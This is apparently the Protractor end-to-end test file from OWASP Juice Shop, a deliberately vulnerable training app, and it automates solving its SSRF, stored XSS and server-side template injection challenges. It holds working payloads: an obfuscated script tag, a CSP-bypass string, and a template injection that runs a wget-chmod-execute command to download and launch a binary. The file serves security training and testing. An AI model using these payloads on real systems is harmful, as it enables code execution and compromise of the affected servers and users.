/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setProfileImageButton

  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  describe('challenge "ssrf"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      browser.waitForAngularEnabled(false)
      browser.get('/profile')
      url = element(by.id('url'))
      submitButton = element(by.id('submitUrl'))
      url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
      submitButton.click()
      browser.get('/')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'SSRF' })
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "usernameXss"', () => {
      it('Username field should be susceptible to XSS attacks', () => {
        browser.waitForAngularEnabled(false)
        browser.get('/profile')

        const EC = protractor.ExpectedConditions
        url = element(by.id('url'))
        setProfileImageButton = element(by.id('submitUrl'))
        url.sendKeys("https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com")
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('<<a|ascript>alert(`xss`)</script>')
        submitButton.click()
        browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /profile")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
        })
        username.clear()
        username.sendKeys('αδмιη') // disarm XSS
        submitButton.click()
        url.sendKeys('http://localhost:3000/assets/public/images/uploads/default.svg')
        setProfileImageButton.click()
        browser.driver.sleep(5000)
        browser.get('/')
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'Classic Stored XSS' })
    })

    describe('challenge "ssti"', () => {
      it('should be possible to inject arbitrary nodeJs commands in username', () => {
        browser.waitForAngularEnabled(false)
        browser.get('/profile')
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
        submitButton.click()
        browser.get('/')
        browser.driver.sleep(10000)
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'SSTi' })
    })
  }
})
